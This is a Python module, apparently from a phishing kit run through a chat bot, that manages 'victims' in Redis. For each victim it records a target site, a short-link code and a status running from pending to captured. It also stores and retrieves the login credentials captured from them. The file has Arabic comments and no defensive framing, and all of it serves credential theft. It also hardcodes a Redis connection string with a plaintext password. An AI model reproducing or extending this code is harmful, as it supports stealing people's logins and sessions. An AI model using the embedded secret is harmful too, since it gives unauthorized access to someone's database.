# victims_manager.py
# ============================================================
# نظام إدارة الضحايا المتعددين
# ============================================================

import os
import json
import time
import uuid
import redis

# ============================================================
# Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] Victims Manager: ✅ Redis connected")
except Exception as e:
    print(f"[-] Victims Manager Redis error: {e}")
    redis_client = None


# ============================================================
# توليد كود قصير
# ============================================================
def _generate_code(length=8):
    import random
    chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789'
    return ''.join(random.choices(chars, k=length))


# ============================================================
# إدارة الضحايا
# ============================================================
def _victims_set_key(chat_id):
    return f"victims:{chat_id}"

def _victim_key(chat_id, victim_id):
    return f"victim:{chat_id}:{victim_id}"

def _victim_session_key(chat_id, victim_id):
    return f"victim_session:{chat_id}:{victim_id}"


def create_victim(chat_id, name, site):
    """ينشئ ضحية جديدة"""
    if not redis_client:
        return None
    
    try:
        victim_id = uuid.uuid4().hex[:12]
        code = _generate_code(8)
        now = time.time()
        
        # احفظ بيانات الضحية
        victim_data = {
            "victim_id": victim_id,
            "name": name[:50],
            "site": site,
            "code": code,
            "created_at": now,
            "status": "pending",  # pending / active / captured
            "creds_count": 0,
            "session_id": "",
            "last_activity": now,
        }
        
        # Hash للضحية
        redis_client.hset(
            _victim_key(chat_id, victim_id),
            mapping=victim_data
        )
        redis_client.expire(_victim_key(chat_id, victim_id), 86400 * 30)
        
        # أضف لقائمة الضحايا
        redis_client.sadd(_victims_set_key(chat_id), victim_id)
        redis_client.expire(_victims_set_key(chat_id), 86400 * 30)
        
        # اربط الكود بالضحية (للرابط القصير)
        redis_client.setex(
            f"short:{code}",
            86400 * 30,
            json.dumps({
                "chat_id": str(chat_id),
                "victim_id": victim_id,
                "site": site,
                "name": name,
            })
        )
        
        print(f"[+] Victim created: {name} | {site} | code={code}")
        return victim_data
    
    except Exception as e:
        print(f"[-] create_victim error: {e}")
        return None


def get_victim(chat_id, victim_id):
    """يجلب بيانات ضحية"""
    if not redis_client:
        return None
    try:
        data = redis_client.hgetall(_victim_key(chat_id, victim_id))
        if data:
            # تحويل الأنواع
            for k in ["created_at", "last_activity"]:
                if k in data:
                    try: data[k] = float(data[k])
                    except: pass
            for k in ["creds_count"]:
                if k in data:
                    try: data[k] = int(data[k])
                    except: pass
            return data
    except Exception as e:
        print(f"[-] get_victim error: {e}")
    return None


def get_all_victims(chat_id):
    """يجلب كل ضحايا المستخدم"""
    if not redis_client:
        return []
    try:
        victim_ids = redis_client.smembers(_victims_set_key(chat_id))
        victims = []
        for vid in victim_ids:
            v = get_victim(chat_id, vid)
            if v:
                victims.append(v)
        # ترتيب حسب آخر نشاط
        victims.sort(key=lambda x: x.get("last_activity", 0), reverse=True)
        return victims
    except Exception as e:
        print(f"[-] get_all_victims error: {e}")
        return []


def delete_victim(chat_id, victim_id):
    """يحذف ضحية"""
    if not redis_client:
        return False
    try:
        victim = get_victim(chat_id, victim_id)
        if victim:
            # احذف الكود من Redis
            code = victim.get("code")
            if code:
                redis_client.delete(f"short:{code}")
            
            # احذف بيانات الاعتماد
            redis_client.delete(f"sh_creds:{victim_id}")
        
        # احذف الضحية نفسها
        redis_client.delete(_victim_key(chat_id, victim_id))
        redis_client.srem(_victims_set_key(chat_id), victim_id)
        return True
    except Exception as e:
        print(f"[-] delete_victim error: {e}")
        return False


def update_victim_status(chat_id, victim_id, status, creds_count=None):
    """يحدّث حالة الضحية"""
    if not redis_client:
        return False
    try:
        updates = {
            "status": status,
            "last_activity": time.time()
        }
        if creds_count is not None:
            updates["creds_count"] = creds_count
        
        redis_client.hset(_victim_key(chat_id, victim_id), mapping=updates)
        return True
    except Exception as e:
        print(f"[-] update_victim_status error: {e}")
        return False


def rename_victim(chat_id, victim_id, new_name):
    """يغير اسم ضحية"""
    if not redis_client:
        return False
    try:
        redis_client.hset(_victim_key(chat_id, victim_id), "name", new_name[:50])
        return True
    except Exception as e:
        print(f"[-] rename_victim error: {e}")
        return False


def get_victim_by_code(code):
    """يجلب ضحية عن طريق الكود (للرابط القصير)"""
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"short:{code}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        print(f"[-] get_victim_by_code error: {e}")
    return None


def add_creds_to_victim(chat_id, victim_id, creds_data):
    """يضيف بيانات اعتماد لضحية"""
    if not redis_client:
        return False
    try:
        # احفظ في list
        redis_client.lpush(
            f"sh_creds:{victim_id}",
            json.dumps(creds_data, ensure_ascii=False)
        )
        redis_client.expire(f"sh_creds:{victim_id}", 86400 * 30)
        
        # حدّث العداد
        count = redis_client.llen(f"sh_creds:{victim_id}")
        redis_client.hset(_victim_key(chat_id, victim_id), mapping={
            "creds_count": count,
            "status": "captured",
            "last_activity": time.time()
        })
        
        return True
    except Exception as e:
        print(f"[-] add_creds_to_victim error: {e}")
        return False


def get_victim_creds(victim_id):
    """يجلب كل بيانات الاعتماد لضحية"""
    if not redis_client:
        return []
    try:
        raw_list = redis_client.lrange(f"sh_creds:{victim_id}", 0, -1)
        result = []
        for item in raw_list:
            try:
                result.append(json.loads(item))
            except:
                pass
        return result
    except Exception as e:
        print(f"[-] get_victim_creds error: {e}")
        return []
